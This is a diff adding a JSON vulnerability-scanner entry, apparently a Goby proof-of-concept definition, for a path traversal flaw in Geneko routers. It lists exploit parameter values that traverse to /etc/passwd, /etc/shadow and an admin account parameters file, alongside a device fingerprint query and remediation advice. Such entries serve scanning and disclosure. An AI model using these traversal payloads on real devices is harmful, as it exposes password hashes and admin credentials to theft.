@@ -1,0 +1,41 @@
+{
+  "Name": "Geneko Routers Path Traversal",
+  "Description": "Geneko router can read any file, /etc/passwd, device account configuration files, etc.:",
+  "Product": "Geneko Routers",
+  "Homepage": "http://www.geneko.co.rs/",
+  "DisclosureDate": "2021-06-06",
+  "Author": "atdpa4sw0rd@gmail.com",
+  "GobyQuery": "(body=\"lib/gwr.js\" && body=\"files/ruter.css\") ",
+  "Level": "3",
+  "Impact": "<p>The attacker uses the leaked sensitive information to obtain the web path of the website server to provide help for further attacks.<br></p>",
+  "Recommendation": "<p>1. Upgrade the new version</p><p>2. Prohibit Internet access to the device</p>",
+  "References": [
+    "https://blogs.securiteam.com/index.php/archives/3317"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "File",
+      "type": "createSelect",
+      "value": "/../../etc/passwd,/../../etc/shadow,/../../mnt/flash/params/j_admin_admin.params"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": null,
+  "ExploitSteps": null,
+  "Tags": [
+    "Disclosure of Sensitive Information"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
